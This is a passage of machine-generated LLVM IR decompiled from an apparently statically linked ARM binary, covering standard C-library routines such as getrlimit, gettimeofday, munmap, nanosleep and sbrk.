  store i32 -1, i32* @r5, align 4
  %v3_1e92c = add i32 %v4_1e920, %v0_1e924
  %v4_1e92c = inttoptr i32 %v3_1e92c to i32*
  store i32 %v1_1e91c, i32* %v4_1e92c, align 4
  br label %dec_label_pc_1e988

dec_label_pc_1e934:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_1e934
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_1e93c = add i32 %arg2, %arg1
  store i32 %v3_1e93c, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1e934, %bb
  %v1_1e9784 = phi i32 [ %v18_1e8fc, %dec_label_pc_1e934 ], [ %v3_1e93c, %bb ]
  %v0_1e9742 = phi i32 [ 141, %dec_label_pc_1e934 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_1e988, label %dec_label_pc_1e974

dec_label_pc_1e948:                               ; preds = %dec_label_pc_1e974
  %v1_1e97c = inttoptr i32 %v1_1e974 to i8*
  %v1_1e948 = add i32 %v0_1e948, 8
  %v2_1e948 = inttoptr i32 %v1_1e948 to i16*
  %v3_1e948 = load i16, i16* %v2_1e948, align 2
  %v4_1e948 = zext i16 %v3_1e948 to i32
  %v2_1e94c = add i32 %v4_1e948, %v0_1e948
  store i32 %v2_1e94c, i32* @r3, align 4
  %v1_1e950 = add i32 %v2_1e94c, -1
  %v2_1e950 = inttoptr i32 %v1_1e950 to i8*
  %v3_1e950 = load i8, i8* %v2_1e950, align 1
  %v4_1e950 = zext i8 %v3_1e950 to i32
  store i32 %v4_1e950, i32* @r4, align 4
  %v3_1e954 = call i32 @strlen(i8* %v1_1e97c)
  %v0_1e958 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1e958, i32* @r1, align 4
  %v1_1e95c = add i32 %v3_1e954, 1
  store i32 %v1_1e95c, i32* @r2, align 4
  %v0_1e960 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1e960, i32* @r0, align 4
  %v3_1e964 = call i32 @memmove(i32 %v0_1e960, i32 %v0_1e958, i32 %v1_1e95c)
  %v0_1e968 = load i32, i32* %r7.global-to-local, align 4
  %v1_1e968 = add i32 %v0_1e968, 8
  %v2_1e968 = inttoptr i32 %v1_1e968 to i16*
  %v3_1e968 = load i16, i16* %v2_1e968, align 2
  %v4_1e968 = zext i16 %v3_1e968 to i32
  store i32 %v4_1e968, i32* %r3.global-to-local, align 4
  %v0_1e96c = load i32, i32* @r4, align 4
  %v1_1e96c = trunc i32 %v0_1e96c to i8
  %v3_1e96c = add i32 %v0_1e968, 10
  %v4_1e96c = inttoptr i32 %v3_1e96c to i8*
  store i8 %v1_1e96c, i8* %v4_1e96c, align 1
  %v0_1e970 = load i32, i32* %r7.global-to-local, align 4
  %v1_1e970 = load i32, i32* %r3.global-to-local, align 4
  %v2_1e970 = add i32 %v1_1e970, %v0_1e970
  store i32 %v2_1e970, i32* %r7.global-to-local, align 4
  %v1_1e978.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1e974

dec_label_pc_1e974:                               ; preds = %.thread, %dec_label_pc_1e948
  %v1_1e978 = phi i32 [ %v1_1e978.pre, %dec_label_pc_1e948 ], [ %v1_1e9784, %.thread ]
  %v0_1e948 = phi i32 [ %v2_1e970, %dec_label_pc_1e948 ], [ %v0_1e9742, %.thread ]
  %v1_1e974 = add i32 %v0_1e948, 10
  store i32 %v1_1e974, i32* %r6.global-to-local, align 4
  %v3_1e978 = icmp ult i32 %v0_1e948, %v1_1e978
  %v1_1e980 = add i32 %v0_1e948, 11
  store i32 %v1_1e980, i32* %r8.global-to-local, align 4
  br i1 %v3_1e978, label %dec_label_pc_1e948, label %dec_label_pc_1e988

dec_label_pc_1e988:                               ; preds = %dec_label_pc_1e974, %.thread, %dec_label_pc_1e918
  %v0_1e988 = load i32, i32* @r5, align 4
  store i32 %v6_1e8fc, i32* @r5, align 4
  store i32 %v18_1e8fc, i32* @sl, align 4
  ret i32 %v0_1e988

; uselistorder directives
  uselistorder i32 %v1_1e974, { 1, 0 }
  uselistorder i32 %v0_1e948, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_1e8fc, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @memmove, { 5, 7, 6, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1e974, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_1e9a0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1e9ac = call i32 @getrlimit(i32 7, i32 %v2_1e9a0)
  %v1_1e9b0 = icmp slt i32 %v2_1e9ac, 0
  %v5_1e9b4 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_1e9b0, i32 256, i32 %v5_1e9b4
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_1e9d8 = load i32, i32* @r0, align 4
  ret i32 %v1_1e9d8
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_1e9ec = load i32, i32* @r0, align 4
  ret i32 %v1_1e9ec
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1ea00 = load i32, i32* @r0, align 4
  ret i32 %v1_1ea00
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_1ea10 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 148) to i32*), align 4
  %v1_1ea14 = inttoptr i32 %v4_1ea10 to i32*
  %v2_1ea14 = load i32, i32* %v1_1ea14, align 4
  %v2_1ea18 = icmp eq i32 %v2_1ea14, 0
  br i1 %v2_1ea18, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_1ea20 = phi i32 [ %v2_1ea14, %entry ], [ 4096, %bb ]
  ret i32 %v1_1ea20

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1ea58, label %dec_label_pc_1ea40

dec_label_pc_1ea40:                               ; preds = %entry
  %v1_1ea44 = sub i32 0, %arg1
  %v3_1ea48 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1ea48 = sext i16 %v3_1ea48 to i32
  %v0_1ea4c = call i32 @__aeabi_read_tp()
  %v3_1ea50 = add i32 %v4_1ea48, %v0_1ea4c
  %v4_1ea50 = inttoptr i32 %v3_1ea50 to i32*
  store i32 %v1_1ea44, i32* %v4_1ea50, align 4
  br label %dec_label_pc_1ea58

dec_label_pc_1ea58:                               ; preds = %entry, %dec_label_pc_1ea40
  %v1_1ea5c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1ea40 ]
  ret i32 %v1_1ea5c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1ea58, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1ea64 = load i32, i32* @r7, align 4
  store i32 %v3_1ea64, i32* %stack_var_-8, align 4
  %v0_1ea70 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1ea70, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1ea70, -4095
  br i1 %tmp, label %dec_label_pc_1ea98, label %dec_label_pc_1ea80

dec_label_pc_1ea80:                               ; preds = %entry
  %v0_1ea84 = call i32 @__aeabi_read_tp()
  %v3_1ea88 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1ea88 = sext i16 %v3_1ea88 to i32
  %v0_1ea8c = load i32, i32* %r2.global-to-local, align 4
  %v1_1ea8c = sub i32 0, %v0_1ea8c
  store i32 %v1_1ea8c, i32* %r2.global-to-local, align 4
  %v3_1ea90 = add i32 %v4_1ea88, %v0_1ea84
  %v4_1ea90 = inttoptr i32 %v3_1ea90 to i32*
  store i32 %v1_1ea8c, i32* %v4_1ea90, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1ea98.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1ea98

dec_label_pc_1ea98:                               ; preds = %entry, %dec_label_pc_1ea80
  %v1_1ea9c = phi i32 [ %v0_1ea70, %entry ], [ -1, %dec_label_pc_1ea80 ]
  %v2_1ea98 = phi i32 [ %v3_1ea64, %entry ], [ %v2_1ea98.pre, %dec_label_pc_1ea80 ]
  store i32 %v2_1ea98, i32* @r7, align 4
  ret i32 %v1_1ea9c

; uselistorder directives
  uselistorder i32 %v0_1ea70, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1ea98, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_1eab4 = load i32, i32* @r0, align 4
  ret i32 %v1_1eab4
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1eab8 = load i32, i32* @r4, align 4
  store i32 %v3_1eab8, i32* %stack_var_-12, align 4
  %v0_1eac8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1eac8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1eac8, -4095
  br i1 %tmp, label %dec_label_pc_1eaf0, label %dec_label_pc_1ead8

dec_label_pc_1ead8:                               ; preds = %entry
  %v0_1eadc = call i32 @__aeabi_read_tp()
  %v3_1eae0 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1eae0 = sext i16 %v3_1eae0 to i32
  %v0_1eae4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1eae4 = sub i32 0, %v0_1eae4
  store i32 %v1_1eae4, i32* %r2.global-to-local, align 4
  %v3_1eae8 = add i32 %v4_1eae0, %v0_1eadc
  %v4_1eae8 = inttoptr i32 %v3_1eae8 to i32*
  store i32 %v1_1eae4, i32* %v4_1eae8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1eaf0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1eaf0

dec_label_pc_1eaf0:                               ; preds = %entry, %dec_label_pc_1ead8
  %v1_1eaf4 = phi i32 [ %v0_1eac8, %entry ], [ -1, %dec_label_pc_1ead8 ]
  %v2_1eaf0 = phi i32 [ %v3_1eab8, %entry ], [ %v2_1eaf0.pre, %dec_label_pc_1ead8 ]
  store i32 %v2_1eaf0, i32* @r4, align 4
  ret i32 %v1_1eaf4

; uselistorder directives
  uselistorder i32 %v0_1eac8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1eaf0, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1eafc = load i32, i32* @r7, align 4
  store i32 %v3_1eafc, i32* %stack_var_-8, align 4
  %v0_1eb08 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1eb08, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1eb08, -4095
  br i1 %tmp, label %dec_label_pc_1eb30, label %dec_label_pc_1eb18

dec_label_pc_1eb18:                               ; preds = %entry
  %v0_1eb1c = call i32 @__aeabi_read_tp()
  %v3_1eb20 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1eb20 = sext i16 %v3_1eb20 to i32
  %v0_1eb24 = load i32, i32* %r2.global-to-local, align 4
  %v1_1eb24 = sub i32 0, %v0_1eb24
  store i32 %v1_1eb24, i32* %r2.global-to-local, align 4
  %v3_1eb28 = add i32 %v4_1eb20, %v0_1eb1c
  %v4_1eb28 = inttoptr i32 %v3_1eb28 to i32*
  store i32 %v1_1eb24, i32* %v4_1eb28, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1eb30.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1eb30

dec_label_pc_1eb30:                               ; preds = %entry, %dec_label_pc_1eb18
  %v1_1eb34 = phi i32 [ %v0_1eb08, %entry ], [ -1, %dec_label_pc_1eb18 ]
  %v2_1eb30 = phi i32 [ %v3_1eafc, %entry ], [ %v2_1eb30.pre, %dec_label_pc_1eb18 ]
  store i32 %v2_1eb30, i32* @r7, align 4
  ret i32 %v1_1eb34

; uselistorder directives
  uselistorder i32 %v0_1eb08, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1eb30, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1eb3c = load i32, i32* @r7, align 4
  store i32 %v3_1eb3c, i32* %stack_var_-8, align 4
  %v0_1eb48 = load i32, i32* @r0, align 4
  store i32 %v0_1eb48, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1eb48, -4095
  br i1 %tmp, label %dec_label_pc_1eb70, label %dec_label_pc_1eb58

dec_label_pc_1eb58:                               ; preds = %entry
  %v0_1eb5c = call i32 @__aeabi_read_tp()
  %v3_1eb60 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1eb60 = sext i16 %v3_1eb60 to i32
  %v0_1eb64 = load i32, i32* %r2.global-to-local, align 4
  %v1_1eb64 = sub i32 0, %v0_1eb64
  store i32 %v1_1eb64, i32* %r2.global-to-local, align 4
  %v3_1eb68 = add i32 %v4_1eb60, %v0_1eb5c
  %v4_1eb68 = inttoptr i32 %v3_1eb68 to i32*
  store i32 %v1_1eb64, i32* %v4_1eb68, align 4
  %v2_1eb70.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1eb70

dec_label_pc_1eb70:                               ; preds = %entry, %dec_label_pc_1eb58
  %v1_1eb74 = phi i32 [ %v0_1eb48, %entry ], [ -1, %dec_label_pc_1eb58 ]
  %v2_1eb70 = phi i32 [ %v3_1eb3c, %entry ], [ %v2_1eb70.pre, %dec_label_pc_1eb58 ]
  store i32 %v2_1eb70, i32* @r7, align 4
  ret i32 %v1_1eb74

; uselistorder directives
  uselistorder i32 %v0_1eb48, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1eb70, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_1eb88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 14008) to i32*), align 4
  %v2_1eb8c = icmp eq i32 %v4_1eb88, 0
  %v3_1eb90 = load i32, i32* @r4, align 4
  %v9_1eb90 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1eb8c, label %dec_label_pc_1eba0, label %entry.dec_label_pc_1eba8_crit_edge

entry.dec_label_pc_1eba8_crit_edge:               ; preds = %entry
  br label %dec_label_pc_1eba8

dec_label_pc_1eba0:                               ; preds = %entry
  store i32 %v3_1eb90, i32* @r4, align 4
  store i32 %v9_1eb90, i32* @r6, align 4
  %v0_1eba4 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_1eba8

dec_label_pc_1eba8:                               ; preds = %entry.dec_label_pc_1eba8_crit_edge, %dec_label_pc_1eba0
  %v0_1eba8 = call i32 @__libc_enable_asynccancel()
  %v0_1ebac = load i32, i32* @r6, align 4
  store i32 %v0_1ebac, i32* @r1, align 4
  store i32 %v0_1eba8, i32* @r5, align 4
  %v0_1ebb4 = load i32, i32* @r4, align 4
  store i32 %v0_1ebb4, i32* @r0, align 4
  %v0_1ebb8 = call i32 @__syscall_nanosleep()
  store i32 %v0_1ebb8, i32* @r4, align 4
  %v0_1ebc0 = load i32, i32* @r5, align 4
  %v1_1ebc4 = call i32 @__libc_disable_asynccancel(i32 %v0_1ebc0)
  %v0_1ebc8 = load i32, i32* @r4, align 4
  ret i32 %v0_1ebc8

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 3, 10, 13, 1, 2, 9, 6, 8, 5, 4, 12, 7, 11, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 3, 10, 13, 1, 2, 9, 6, 8, 5, 4, 12, 7, 11, 0 }
  uselistorder label %dec_label_pc_1eba8, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1ebdc = load i32, i32* @r4, align 4
  store i32 %v3_1ebdc, i32* %stack_var_-16, align 4
  store i32 11616, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r4.global-to-local, align 4
  %v4_1ebec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 11616) to i32*), align 4
  %v2_1ebf0 = icmp eq i32 %v4_1ebec, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_1ebf0, label %dec_label_pc_1ebfc, label %dec_label_pc_1ec0c

dec_label_pc_1ebfc:                               ; preds = %entry
  %v1_1ec00 = call i32 @__GI_brk(i32 0)
  %v1_1ec04 = icmp slt i32 %v1_1ec00, 0
  br i1 %v1_1ec04, label %dec_label_pc_1ec30, label %dec_label_pc_1ec0cthread-pre-split

dec_label_pc_1ec0cthread-pre-split:               ; preds = %dec_label_pc_1ebfc
  %v0_1ec10.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_1ec0c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1ec0c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1ec0c

dec_label_pc_1ec0c:                               ; preds = %dec_label_pc_1ec0cthread-pre-split, %entry
  %v1_1ec0c = phi i32 [ %v1_1ec0c.pre, %dec_label_pc_1ec0cthread-pre-split ], [ 11616, %entry ]
  %v0_1ec0c = phi i32 [ %v0_1ec0c.pre, %dec_label_pc_1ec0cthread-pre-split ], [ ptrtoint (i32* @global_var_2c010.418 to i32), %entry ]
  %v1_1ec20 = phi i32 [ %v0_1ec10.pr, %dec_label_pc_1ec0cthread-pre-split ], [ %arg1, %entry ]
  %v2_1ec0c = add i32 %v0_1ec0c, %v1_1ec0c
  %v3_1ec0c = inttoptr i32 %v2_1ec0c to i32*
  %v4_1ec0c = load i32, i32* %v3_1ec0c, align 4
  %v2_1ec10 = icmp eq i32 %v1_1ec20, 0
  store i32 %v4_1ec0c, i32* %r4.global-to-local, align 4
  br i1 %v2_1ec10, label %dec_label_pc_1ec34, label %dec_label_pc_1ec1c

dec_label_pc_1ec1c:                               ; preds = %dec_label_pc_1ec0c
  %v2_1ec20 = add i32 %v4_1ec0c, %v1_1ec20
  %v1_1ec24 = call i32 @__GI_brk(i32 %v2_1ec20)
  %v1_1ec28 = icmp slt i32 %v1_1ec24, 0
  br i1 %v1_1ec28, label %dec_label_pc_1ec30, label %dec_label_pc_1ec1c.dec_label_pc_1ec34_crit_edge

dec_label_pc_1ec1c.dec_label_pc_1ec34_crit_edge:  ; preds = %dec_label_pc_1ec1c
  %v0_1ec34.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1ec34

dec_label_pc_1ec30:                               ; preds = %dec_label_pc_1ec1c, %dec_label_pc_1ebfc
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1ec34

dec_label_pc_1ec34:                               ; preds = %dec_label_pc_1ec0c, %dec_label_pc_1ec1c.dec_label_pc_1ec34_crit_edge, %dec_label_pc_1ec30
  %v0_1ec34 = phi i32 [ %v0_1ec34.pre, %dec_label_pc_1ec1c.dec_label_pc_1ec34_crit_edge ], [ -1, %dec_label_pc_1ec30 ], [ %v4_1ec0c, %dec_label_pc_1ec0c ]
  %v2_1ec38 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1ec38, i32* @r4, align 4
  ret i32 %v0_1ec34

; uselistorder directives
  uselistorder i32 %v4_1ec0c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_1ec34, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1ec58 = load i32, i32* @r0, align 4
  ret i32 %v1_1ec58
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1ec5c = load i32, i32* @r4, align 4
  store i32 %v3_1ec5c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_1ec74 = inttoptr i32 %arg2 to i8*
  %v4_1ec74 = call i32 @__GI_memset(i8* %v3_1ec74, i32 0, i32 104)
  %v2_1ec78 = load i32, i32* %arg1, align 4
  store i32 %v2_1ec78, i32* %r3.global-to-local, align 4
  %v3_1ec78 = add i32 %tmp, 4
  %v4_1ec78 = inttoptr i32 %v3_1ec78 to i32*
  %v5_1ec78 = load i32, i32* %v4_1ec78, align 4
  store i32 %v5_1ec78, i32* %r4.global-to-local, align 4
  %v0_1ec7c = load i32, i32* %r5.global-to-local, align 4
  %v1_1ec7c = inttoptr i32 %v0_1ec7c to i32*
  store i32 %v2_1ec78, i32* %v1_1ec7c, align 4
  %v3_1ec7c = add i32 %v0_1ec7c, 4
  %v4_1ec7c = inttoptr i32 %v3_1ec7c to i32*
  %v5_1ec7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1ec7c, i32* %v4_1ec7c, align 4
  %v0_1ec80 = load i32, i32* %r6.global-to-local, align 4
  %v1_1ec80 = add i32 %v0_1ec80, 12
  %v2_1ec80 = inttoptr i32 %v1_1ec80 to i32*
  %v3_1ec80 = load i32, i32* %v2_1ec80, align 4
  %v1_1ec84 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ec84 = add i32 %v1_1ec84, 12
  %v3_1ec84 = inttoptr i32 %v2_1ec84 to i32*
  store i32 %v3_1ec80, i32* %v3_1ec84, align 4
  %v0_1ec88 = load i32, i32* %r6.global-to-local, align 4
  %v1_1ec88 = add i32 %v0_1ec88, 96
  store i32 %v1_1ec88, i32* %r3.global-to-local, align 4
  %v1_1ec8c = inttoptr i32 %v1_1ec88 to i32*
  %v2_1ec8c = load i32, i32* %v1_1ec8c, align 4
  store i32 %v2_1ec8c, i32* %r3.global-to-local, align 4
  %v3_1ec8c = add i32 %v0_1ec88, 100
  %v4_1ec8c = inttoptr i32 %v3_1ec8c to i32*
  %v5_1ec8c = load i32, i32* %v4_1ec8c, align 4
  store i32 %v5_1ec8c, i32* %r4.global-to-local, align 4
  %v1_1ec90 = add i32 %v0_1ec88, 56
  %v2_1ec90 = inttoptr i32 %v1_1ec90 to i32*
  %v3_1ec90 = load i32, i32* %v2_1ec90, align 4
  store i32 %v3_1ec90, i32* %r2.global-to-local, align 4
  %v1_1ec94 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ec94 = add i32 %v1_1ec94, 96
  %v3_1ec94 = inttoptr i32 %v2_1ec94 to i32*
  store i32 %v2_1ec8c, i32* %v3_1ec94, align 4
  %v0_1ec98 = load i32, i32* %r4.global-to-local, align 4
  %v1_1ec98 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ec98 = add i32 %v1_1ec98, 100
  %v3_1ec98 = inttoptr i32 %v2_1ec98 to i32*
  store i32 %v0_1ec98, i32* %v3_1ec98, align 4
  %v0_1ec9c = load i32, i32* %r6.global-to-local, align 4
  %v1_1ec9c = add i32 %v0_1ec9c, 24
  store i32 %v1_1ec9c, i32* %ip.global-to-local, align 4
  %v1_1eca0 = inttoptr i32 %v1_1ec9c to i32*
  %v2_1eca0 = load i32, i32* %v1_1eca0, align 4
  store i32 %v2_1eca0, i32* %ip.global-to-local, align 4
  %v3_1eca0 = add i32 %v0_1ec9c, 28
  %v4_1eca0 = inttoptr i32 %v3_1eca0 to i32*
  %v5_1eca0 = load i32, i32* %v4_1eca0, align 4
  store i32 %v5_1eca0, i32* %lr.global-to-local, align 4
  %v0_1eca4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1eca4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1eca4 = add i32 %v1_1eca4, 56
  %v3_1eca4 = inttoptr i32 %v2_1eca4 to i32*
  store i32 %v0_1eca4, i32* %v3_1eca4, align 4
  %v0_1eca8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1eca8 = add i32 %v0_1eca8, 72
  store i32 %v1_1eca8, i32* %r3.global-to-local, align 4
  %v1_1ecac = add i32 %v0_1eca8, 32
  store i32 %v1_1ecac, i32* %r7.global-to-local, align 4
  %v1_1ecb0 = inttoptr i32 %v1_1ecac to i32*
  %v2_1ecb0 = load i32, i32* %v1_1ecb0, align 4
  store i32 %v2_1ecb0, i32* %r7.global-to-local, align 4
  %v3_1ecb0 = add i32 %v0_1eca8, 36
  %v4_1ecb0 = inttoptr i32 %v3_1ecb0 to i32*
  %v5_1ecb0 = load i32, i32* %v4_1ecb0, align 4
  store i32 %v5_1ecb0, i32* %r8.global-to-local, align 4
  %v1_1ecb4 = inttoptr i32 %v1_1eca8 to i32*
  %v2_1ecb4 = load i32, i32* %v1_1ecb4, align 4
  %v3_1ecb4 = add i32 %v0_1eca8, 76
  %v4_1ecb4 = inttoptr i32 %v3_1ecb4 to i32*
  %v5_1ecb4 = load i32, i32* %v4_1ecb4, align 4
  store i32 %v5_1ecb4, i32* %r1.global-to-local, align 4
  %v0_1ecb8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ecb8 = add i32 %v0_1ecb8, 72
  %v1_1ecbc = inttoptr i32 %v1_1ecb8 to i32*
  store i32 %v2_1ecb4, i32* %v1_1ecbc, align 4
  %v3_1ecbc = add i32 %v0_1ecb8, 76
  %v4_1ecbc = inttoptr i32 %v3_1ecbc to i32*
  %v5_1ecbc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1ecbc, i32* %v4_1ecbc, align 4
  %v0_1ecc0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1ecc0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ecc0 = add i32 %v1_1ecc0, 32
  %v3_1ecc0 = inttoptr i32 %v2_1ecc0 to i32*
  store i32 %v0_1ecc0, i32* %v3_1ecc0, align 4
  %v0_1ecc4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1ecc4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ecc4 = add i32 %v1_1ecc4, 36
  %v3_1ecc4 = inttoptr i32 %v2_1ecc4 to i32*
  store i32 %v0_1ecc4, i32* %v3_1ecc4, align 4
  %v0_1ecc8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1ecc8 = add i32 %v0_1ecc8, 80
  store i32 %v1_1ecc8, i32* %r3.global-to-local, align 4
  %v1_1eccc = add i32 %v0_1ecc8, 48
  store i32 %v1_1eccc, i32* %r7.global-to-local, align 4
  %v1_1ecd0 = inttoptr i32 %v1_1eccc to i32*
  %v2_1ecd0 = load i32, i32* %v1_1ecd0, align 4
  store i32 %v2_1ecd0, i32* %r7.global-to-local, align 4
  %v3_1ecd0 = add i32 %v0_1ecc8, 52
  %v4_1ecd0 = inttoptr i32 %v3_1ecd0 to i32*
  %v5_1ecd0 = load i32, i32* %v4_1ecd0, align 4
  store i32 %v5_1ecd0, i32* %r8.global-to-local, align 4
  %v1_1ecd4 = inttoptr i32 %v1_1ecc8 to i32*
  %v2_1ecd4 = load i32, i32* %v1_1ecd4, align 4
  %v3_1ecd4 = add i32 %v0_1ecc8, 84
  %v4_1ecd4 = inttoptr i32 %v3_1ecd4 to i32*
  %v5_1ecd4 = load i32, i32* %v4_1ecd4, align 4
  store i32 %v5_1ecd4, i32* %r1.global-to-local, align 4
  %v1_1ecd8 = add i32 %v0_1ecc8, 16
  %v2_1ecd8 = inttoptr i32 %v1_1ecd8 to i32*
  %v3_1ecd8 = load i32, i32* %v2_1ecd8, align 4
  store i32 %v3_1ecd8, i32* %r2.global-to-local, align 4
